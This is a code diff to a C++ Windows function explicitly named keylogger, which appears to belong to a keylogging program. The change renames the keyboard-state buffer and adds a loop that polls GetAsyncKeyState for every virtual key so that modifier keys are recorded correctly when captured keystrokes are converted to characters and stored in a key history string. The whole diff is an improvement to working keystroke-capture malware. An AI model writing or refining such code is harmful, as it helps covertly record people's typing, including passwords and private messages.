@@ -28,15 +28,21 @@ std::string keylogger(std::string &key_history, std::unordered_map<int, int> &wa
                     
                     // LOGGING THE KEY
                     // Getting the status of the key modifiers
-                    BYTE modifier_status[256];
-                    GetKeyboardState(modifier_status);
+                    BYTE keyboard_state[256];
+                    GetKeyboardState(keyboard_state);
 
+                    for (int vk = 0; vk < 256; vk++) {
+                        if (GetAsyncKeyState(vk) & 0x8000) {
+                            keyboard_state[vk] |= 0x80;
+                        }
+                    }
+                    
                     // Getting the hardware scan code for the key
                     int key_scan_code = MapVirtualKey(key, MAPVK_VK_TO_VSC);
 
                     // Setting up the output variable
                     WORD ascii_code;
-                    int result = ToAscii(key, key_scan_code, modifier_status, &ascii_code, 0);
+                    int result = ToAscii(key, key_scan_code, keyboard_state, &ascii_code, 0);
 
                     // Storing the key into a string.
                     char helper_c = static_cast<char>(ascii_code);
